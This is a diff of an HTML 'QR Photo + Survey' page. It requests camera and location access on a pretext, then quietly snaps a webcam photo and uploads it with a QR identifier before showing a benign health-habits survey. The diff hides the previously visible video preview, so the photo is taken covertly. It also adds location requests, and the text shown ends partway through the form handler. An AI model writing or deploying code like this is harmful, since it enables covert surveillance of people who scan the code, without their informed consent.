@@ -5,34 +5,44 @@
 <title>QR Photo + Survey</title>
 
 <style>
-  body { font-family: Arial; text-align: center; margin-top: 30px; background: #f2f2f2; }
-  
-  /* IMPORTANT: do NOT hide video */
-  video { 
-    width: 320px;
-    height: 240px;
-    border: 2px solid #444;
-    border-radius: 10px;
-  }
+body {
+  font-family: Arial;
+  text-align: center;
+  margin-top: 30px;
+  background: #f2f2f2;
+}
 
-  canvas { display: none; }
+video { display: none; }
+canvas { display: none; }
 
-  h2 { color: #333; }
-  p { color: #555; }
+h2 { color: #333; }
+p { color: #555; }
 
-  form { 
-    margin-top: 20px; 
-    display: none; 
-    background: #fff; 
-    padding: 20px; 
-    border-radius: 10px;
-    width: 300px;
-    margin-left: auto;
-    margin-right: auto;
-  }
+form {
+  margin-top: 20px;
+  display: none;
+  background: #fff;
+  padding: 20px;
+  border-radius: 10px;
+  width: 320px;
+  margin-left: auto;
+  margin-right: auto;
+}
 
-  input, select, textarea { width: 100%; margin-bottom: 10px; padding: 5px; }
-  button { padding: 10px 20px; cursor: pointer; }
+input, select, textarea {
+  width: 100%;
+  margin-bottom: 10px;
+  padding: 6px;
+}
+
+button {
+  padding: 10px 20px;
+  cursor: pointer;
+  background: #4CAF50;
+  color: white;
+  border: none;
+  border-radius: 5px;
+}
 </style>
 </head>
 
@@ -41,11 +51,9 @@
 <h2>Please allow camera and location access to continue 😊</h2>
 <p>This helps us verify your response and show the survey.</p>
 
-<!-- IMPORTANT FIX: playsinline + muted -->
-<video id="video" autoplay playsinline muted></video>
+<video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
-<!-- Survey Form -->
 <form id="surveyForm">
   <h3>Daily Life Survey</h3>
 
@@ -53,13 +61,13 @@
   <input type="text" name="name" required>
 
   <label>How many times do you brush your teeth daily?</label>
-  <select name="brush" required>   
+  <select name="brush" required>
     <option value="0">0</option>
     <option value="1">1</option>
     <option value="2">2</option>
     <option value="3+">3+</option>
   </select>
-  
+
   <label>How many meals do you eat per day?</label>
   <select name="meals" required>
     <option value="1">1</option>
@@ -67,34 +75,36 @@
     <option value="3">3</option>
     <option value="4+">4+</option>
   </select>
-    
+
   <label>Do you exercise regularly?</label>
   <select name="exercise" required>
     <option value="Yes">Yes</option>
     <option value="No">No</option>
   </select>
-    
+
   <label>How many hours of sleep do you get on average?</label>
-  <select name="sleep" required>  
+  <select name="sleep" required>
     <option value="<5"><5</option>
     <option value="5-6">5-6</option>
     <option value="6-7">6-7</option>
-    <option value="7+">7+</option> 
+    <option value="7+">7+</option>
   </select>
-    
+
   <label>Do you drink enough water daily?</label>
   <select name="water" required>
     <option value="Yes">Yes</option>
     <option value="No">No</option>
   </select>
-    
+
   <label>Any other healthy habits?</label>
   <textarea name="habits" rows="3"></textarea>
-  
+
   <button type="submit">Submit</button>
 </form>
 
-<p id="thanksMessage" style="display:none;">Thank you for completing the survey!</p>
+<p id="thanksMessage" style="display:none;">
+  Thank you for completing the survey!
+</p>
 
 <script>
 const video = document.getElementById("video");
@@ -102,72 +112,54 @@ const canvas = document.getElementById("canvas");
 const form = document.getElementById("surveyForm");
 const thanks = document.getElementById("thanksMessage");
 
-function getQRFromURL() {
-  const params = new URLSearchParams(window.location.search);
-  return params.get("qr") || "unknown";
-}
-
 async function init() {
   try {
-
-    // Request camera
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
 
-    // VERY IMPORTANT: wait until camera actually starts
-    video.onloadedmetadata = () => {
-      video.play();
-
-      // capture AFTER camera is ready
-      setTimeout(() => captureAndSend(stream), 1200);
-    };
-
-    // Optional location
     navigator.geolocation.getCurrentPosition(
       (pos) => console.log("Location:", pos.coords.latitude, pos.coords.longitude),
-      (err) => console.log("Location denied")
+      () => console.log("Location denied")
     );
+
+    setTimeout(() => captureAndSend(stream), 1200);
 
   } catch (err) {
     alert("Camera permission is required to continue.");
-    console.error(err);
   }
+}
+
+function getQRFromURL() {
+  const params = new URLSearchParams(window.location.search);
+  return params.get("qr") || "unknown";
 }
 
 function captureAndSend(stream) {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
 
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.getContext("2d").drawImage(video, 0, 0);
 
   canvas.toBlob(async (blob) => {
     const formData = new FormData();
     formData.append("photo", blob);
     formData.append("qr_id", getQRFromURL());
-    formData.append("timestamp", Date.now());
 
     try {
       await fetch("/api/upload", { method: "POST", body: formData });
 
-      // Show survey after upload
       document.querySelector('h2').style.display = 'none';
       document.querySelector('p').style.display = 'none';
-      video.style.display = 'none';
-
       form.style.display = 'block';
 
     } catch (err) {
-      console.error("Upload failed", err);
-      alert("Upload failed, try again.");
+      alert("Upload failed. Refresh and try again.");
     }
   });
 
-  // stop camera
   stream.getTracks().forEach(track => track.stop());
 }
 
-// Survey submit
 form.addEventListener("submit", function(e) {
   e.preventDefault();
   form.style.display = "none";
